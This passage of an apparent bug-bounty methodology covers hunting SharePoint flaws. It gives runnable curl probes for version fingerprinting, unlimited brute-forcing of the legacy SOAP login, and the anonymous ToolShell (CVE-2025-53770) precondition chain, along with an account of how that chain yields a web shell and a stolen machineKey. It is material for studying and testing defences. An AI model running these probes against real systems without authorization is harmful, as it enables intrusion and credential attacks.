## Step-by-Step Hunting Methodology

1. **Fingerprint the SharePoint version.** Build number leaks anonymously through several paths. Map the result to the CVE matrix immediately.

   ```bash
   # Method 1: _vti_inf.html (always anonymous, always present)
   curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_vti_inf.html"
   # → FPVersion="[REDACTED_IP]" (15.x = SP2013, 16.x = SP2016/2019/SE)

   # Method 2: _api/contextinfo POST (anonymous on most farms)
   curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.example/_api/contextinfo" \
     -H "Accept: application/json;odata=verbose" \
     | jq -r '.d.GetContextWebInformation.LibraryVersion'
   # → "15.0.5545.1000" (full build number)

   # Method 3: /_layouts/15/start.aspx body
   curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_layouts/15/start.aspx" \
     | grep -oE "15\.[0-9]+\.[0-9]+\.[0-9]+|16\.[0-9]+\.[0-9]+\.[0-9]+"
   ```

   **Map to CVE matrix:**

   | Build | Edition | Status | Notable unpatched-after-EoL CVEs |
   |---|---|---|---|
   | `15.0.5545.1000` | SP2013 final CU | **EoL 2023-04-11** | CVE-2023-29357, CVE-2023-33160/33157/36941, CVE-2024-21318/30043/38023/38024/38094, CVE-2025-53770/53771, CVE-2025-29794 |
   | `16.0.10416.x` | SP2016 | EoL 2026-07-14 | depends on patch level |
   | `16.0.10417.x+` | SP2019 / SE | active | check Microsoft's monthly Patch Tuesday |

2. **Anonymous-endpoint matrix probe.** Walk every endpoint in the table below in one pass. Anything anonymous becomes part of the attack chain.

   ```
   /_vti_inf.html                                          → version disclosure
   /_layouts/15/start.aspx                                 → version disclosure + session minting
   /_layouts/15/blank.htm                                  → benign anchor for smuggling probes
   /_layouts/15/error.aspx                                 → request-validator behaviour probe
   /_layouts/15/Authenticate.aspx?Source=                  → redirect-chain behaviour
   /_layouts/15/AccessDenied.aspx?Source=                  → redirect-chain behaviour
   /_layouts/15/SignOut.aspx                               → logout — anonymous OK
   /_layouts/15/closeConnection.aspx                       → anonymous OK
   /_layouts/15/scriptresx.ashx?culture=en-us&name=SP.Res  → 35KB localised strings
   /_layouts/15/scriptresx.ashx?culture=en-us&name=core    → 277KB localised strings
   /_layouts/15/ToolPane.aspx?DisplayMode=Edit             → ToolShell precondition (THIS IS THE BIG ONE)
   /_layouts/15/Picker.aspx                                → SafeControl recon (see step 6)
   /_layouts/15/<CustomerName>/pages/login/customlogin.aspx    → custom Forms login (replace `<CustomerName>` with target's customer name)
   /_vti_bin/Authentication.asmx                           → legacy SOAP login — anonymous brute-force (CRITICAL)
   /_vti_bin/Authentication.asmx?WSDL                      → WSDL — confirms Login + Mode ops
   /_vti_bin/SharedAccess.asmx                             → often anonymous
   /_vti_bin/spsdisco.aspx                                 → SP service discovery
   /_api/contextinfo (POST)                                → anonymous FormDigest mint (HIGH)
   /_api/$metadata                                         → 381KB API surface enumeration
   /_api/Search                                            → search service descriptor
   /_api/web/CurrentUser                                   → 401 anon BUT WWW-Authenticate: NTLM leaks AD info (see hunt-ntlm-info)
   ```

3. **Legacy SOAP login bypass via Authentication.asmx.** Cross-reference `hunt-auth-bypass` Legacy-Protocol Matrix. The standard probe:

   ```bash
   # First: confirm Mode = Forms (else this attack vector is N/A)
   curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.example/_vti_bin/Authentication.asmx" \
     -H "Content-Type: text/xml; charset=utf-8" \
     -H "SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Mode" \
     -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Mode xmlns="http://schemas.microsoft.com/sharepoint/soap/" /></soap:Body></soap:Envelope>'
   # → <ModeResult>Forms</ModeResult>  ← target is exploitable
   # → <ModeResult>Windows</ModeResult>  ← target uses Windows auth only; this vector N/A

   # Then: confirm no rate limit / no lockout (synthetic non-existent users ONLY)
   # Send 10 bursts at "burst-test-synthetic-zzz" with distinct wrong passwords
   # If all 10 return 200 / 431 bytes / uniform timing → confirmed unlimited brute-force surface
   ```

   **Severity:** Critical when anonymous + no rate limit + no lockout. Submit as bug-bounty even before demonstrating successful auth — the *unbounded credential validation* is the bug, not "I cracked X credential."

4. **ToolShell precondition chain probe** (CVE-2025-53770 class). Three sub-requests:

   ```bash
   # Sub-step a: anonymous GET on ToolPane.aspx
   curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit"
   # Body should contain: __REQUESTDIGEST="0x...,..."  AND  __VIEWSTATEENCRYPTED=""
   # If both: precondition stack is anonymous-reachable.

   # Sub-step b: anonymous POST to /_api/contextinfo
   curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.example/_api/contextinfo" \
     -H "Accept: application/json;odata=verbose" \
     | jq -r '.d.GetContextWebInformation.FormDigestValue'
   # Should return a valid digest with 1800s validity.

   # Sub-step c: anonymous POST to ToolPane.aspx with that digest as X-RequestDigest
   curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
     -H "X-RequestDigest: <digest from step b>" \
     --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none"
   # Should return 200 OK — server treats anonymous-with-digest as authorised state-changing POST.
   ```

   **Severity:** Critical on EoL SP2013 (no patch will ever ship). High on SP2016/2019/SE if `__VIEWSTATEENCRYPTED` is non-empty (encrypted ViewState mitigates the deserialization arm but precondition still warns of misconfig).

   **IMPORTANT:** Do NOT actually deliver a malicious ViewState payload. The precondition chain is sufficient evidence for the report. In the real CVE-2025-53770 chain, machineKey recovery is NOT a precondition for RCE: the auth-bypass (CVE-2025-49706, crafted Referer to ToolPane.aspx) + insecure deserialization (CVE-2025-49704) yield an initial web shell with no machineKey knowledge. The `<machineKey>` (ValidationKey/DecryptionKey) is then DUMPED by that web shell and used to forge signed `__VIEWSTATE` for persistent/unauthenticated re-exploitation. So machineKey is the loot of the first RCE and the persistence arm, not a gate in front of it — do not under-assess an exploitable farm just because machineKey is unknown.

5. **NTLM Type-2 AD topology disclosure.** Cross-reference `hunt-ntlm-info` for full methodology. Quick check:

   ```bash
   # Use Burp send_http1_request with keep-alive, or Python raw socket
   # Anonymous Type-1 with NetBIOS-info request flag:
   #   Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
   # Decode the Type-2 challenge → leaks NetBIOS domain, DNS forest, computer name
   ```

   **Severity:** Medium when chained with internet exposure + default `WIN-XXXXXXXXXXX` hostname; Informational otherwise.

6. **SafeControl enumeration via Picker.aspx.** Picker.aspx differentiates two error states by class existence:
   - Type EXISTS but not whitelisted: `"Only PickerDialog types can be used with the dialog. The type should be configured as a safecontrol in this site."`
   - Type DOES NOT exist: `"Could not load type '<Class>' from assembly 'Microsoft.SharePoint, Version=[REDACTED_IP], Culture=neutral, PublicKeyToken=71e9bce111e9429c'."`

   Feed a wordlist of `Microsoft.SharePoint.*.WebControls.*` and `Microsoft.SharePoint.WebPartPages.*` types to enumerate reachable classes. The list itself is recon for CVE-2019-0604-family chains.

   ```bash
   for cls in \
     "Microsoft.SharePoint.WebControls.PeopleEditor" \
     "Microsoft.SharePoint.WebControls.ItemPicker" \
     "Microsoft.SharePoint.WebPartPages.DataFormWebPart" \
     ; do
     curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$cls")&typeName=System.String" \
       | grep -oE "<title>[^<]+</title>"
   done
   ```

7. **`download.aspx` is NOT outbound SSRF — recognize and don't waste time.** SP's `/_layouts/15/download.aspx?SourceUrl=` is an **SP-internal path resolver**, not a generic URL fetcher. Behaviours:
   - External URL (`http://evil.example.com/x`) → 500 with `"The Web application at <URL> could not be found"` — server tried to resolve as an SP web app, didn't fetch.
   - Same-origin file URL → 500 with `"<nativehr>0x81070211</nativehr>...Cannot open file '<path>'"` — server tried SPFile.OpenBinary, file not found.
   - Files matching the extension blocklist (`.ashx`, `.asmx`, `.svc`, `.config`) → 500 with `"file blocked from this Web site by the server administrators"` regardless of whether the file exists.
   - `file://`, UNC paths, `gopher://`, etc. → 500 with `"Value does not fall within the expected range"` — URL-scheme validator rejects.

   **The error-message URL echo is NOT confirmation of SSRF.** Confirm via Burp Collaborator OOB before claiming. (Cross-reference `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate.) Verified negative in authorized engagement: 38 Collaborator-tagged payloads across 12+ URL-accepting SP parameters → zero callbacks.

   The extension blocklist also looks like a "file-existence oracle" (existing vs not-found returns different responses) but it's actually just the SP file-extension policy. Don't infer file presence from the blocklist response.

8. **Custom-branding module enumeration.** Customer-customised SP installations almost always have a `/_layouts/15/<CustomerName>/` directory tree. Find the name from the login URL (e.g. `/_layouts/15/<CustomerName>/pages/login/customlogin.aspx` → customer name is `<CustomerName>`). Then probe:

   ```bash
   for sub in pages Pages js Js JS css scripts handlers controls images config data services api; do
     curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code} %{size_download}\n" \
       "https://target.example/_layouts/15/CustomerName/$sub/"
     # 301/302 with auth-redirect = directory exists; 404 = missing; 403 = directory listing blocked but path valid
   done
   ```

   JS bundles often contain hardcoded endpoint URLs, hidden routes, internal API paths. Pull each with proper `Referer` header (some are referer-gated).

9. **Search service probe.** `/_api/Search` returns a small JSON descriptor anonymously. `/_api/search/query?querytext='X'` returns 500 with stack trace if the Search Service Application is not running — useful infra disclosure but not directly exploitable.

10. **Authenticated post-login surfaces** (if you have valid credentials):
    - `/_api/web/Lists` — enumerate lists
    - `/_api/web/SiteUsers` — enumerate users
    - `/_api/web/getfolderbyserverrelativeurl('/Shared Documents')/Files` — file enumeration
    - `/_layouts/15/people.aspx` — user listing
    - Custom customer-branded modules — check for IDOR, business logic
    - Workflow Services (`/_api/SP.WorkflowServices.*`)

---

